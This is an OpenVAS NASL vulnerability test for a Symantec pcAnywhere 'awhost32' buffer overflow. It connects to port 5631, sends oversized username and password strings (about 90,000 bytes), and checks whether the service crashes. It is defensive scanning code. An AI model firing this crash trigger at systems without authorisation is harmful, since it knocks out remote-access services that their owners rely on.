###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_symantec_pcanywhere_awhost32_code_exec_vuln.nasl 12 2013-10-27 11:15:33Z jan $
#
# Symantec pcAnywhere 'awhost32' Remote Code Execution Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attackers to cause buffer overflow
  condition or execute arbitrary code or cause a denial of service condition.
  Impact Level: System/Application";
tag_affected = "Symantec pcAnywhere version 12.5.x through 12.5.3
  Symantec pcAnywhere Solution shipped with Altiris IT Management Suite 7.0 (12.5.x)
  Symantec pcAnywhere Solution shipped with Altiris IT Management Suite 7.1 (12.6.x)";
tag_insight = "The host services component 'awhost32' fails to filter crafted long
  login and authentication data sent on TCP port 5631, which could be
  exploited by remote attackers to cause a buffer overflow condition.";
tag_solution = "Upgrade to Symantec pcAnywhere 12.5 SP4 or pcAnywhere Solution 12.6.7
  or Apply Symantec hotfix TECH182142,
  For updates refer to
  http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&pvid=security_advisory&year=2012&suid=20120124_00";
tag_summary = "This host is running Symantec pcAnywhere and is prone to remote
  code execution vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802884";
CPE = "cpe:/a:symantec:pcanywhere";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 12 $");
  script_cve_id("CVE-2011-3478", "CVE-2011-3479", "CVE-2012-0292", "CVE-2012-0291");
  script_bugtraq_id(51592);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"risk_factor", value:"Critical");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 12:15:33 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2012-07-09 12:27:08 +0530 (Mon, 09 Jul 2012)");
  script_name("Symantec pcAnywhere 'awhost32' Remote Code Execution Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;


  script_description(desc);
  script_summary("Check if Symantec pcAnywhere is vulnerable to remote code execution");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_dependencies("gb_symantec_pcanywhere_access_server_detect.nasl");
  script_require_ports("Services/unknown", 5631);
  script_require_keys("Symantec/pcAnywhere-server/Installed");
  script_family("Buffer overflow");
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  script_xref(name : "URL" , value : "http://www.osvdb.org/78532");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/47744");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Jan/154");
  script_xref(name : "URL" , value : "http://seclists.org/bugtraq/2012/Jan/161");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/19407");
  script_xref(name : "URL" , value : "http://www.zerodayinitiative.com/advisories/ZDI-12-018");
  script_xref(name : "URL" , value : "http://www.symantec.com/security_response/securityupdates/detail.jsp?fid=security_advisory&amp;pvid=security_advisory&amp;year=2012&amp;suid=20120301_00");
  exit(0);
}


include("host_details.inc");

## Variable Initialization
initial = "";
resp  = "";
soc  = 0;
soc2 = 0;
pcAnyport = 0;

## Get the Symantec pcAnywhere port
if(!pcAnyport = get_app_port(cpe:CPE, nvt:SCRIPT_OID)){
  exit(0);
}

## Check port status
if(!get_port_state(pcAnyport)){
  exit(0);
}

## Open tcp socket
soc = open_sock_tcp(pcAnyport);
if(!soc){
  exit(0);
}

## Send initial request
initial = raw_string(0x00, 0x00, 0x00, 0x00);
send(socket:soc, data: initial);
sleep(2);
resp = recv(socket:soc, length:1024);

## Send Handshake Packet to Enter login details
handshake = raw_string(0x0d, 0x06, 0xfe);

## Sending Login Request
send(socket:soc, data: handshake);
resp = recv(socket:soc, length:1024);

if(!resp || "Enter login name" >!< resp)
{
  close(soc);
  exit(0);
}

## Constuct Malformed Username
pcuser = raw_string(crap(data:raw_string(0x41), length: 30000));
pcuser = pcuser + pcuser + pcuser;

## Sending Malformed Username
send(socket:soc, data: pcuser);
sleep(3);

## Constuct Malformed Password
pcpass = raw_string(crap(data:raw_string(0x42), length: 28000));
pcpass = pcpass + pcpass + pcpass ;

## Sending Malformed Username
send(socket:soc, data: pcpass);
close(soc);
sleep(3);

## Confirm if pcAnywhere host service got crashed
## By sending initial request

soc2 = open_sock_tcp(pcAnyport);
if(!soc2)
{
  security_hole(pcAnyport);
  exit(0);
}
else
{
  ## Send the initial Request and check for response
  send(socket:soc2, data: initial);
  resp = recv(socket:soc2, length:1024);
  if(!resp)
  {
    security_hole(pcAnyport);
  }
}

close(soc2);
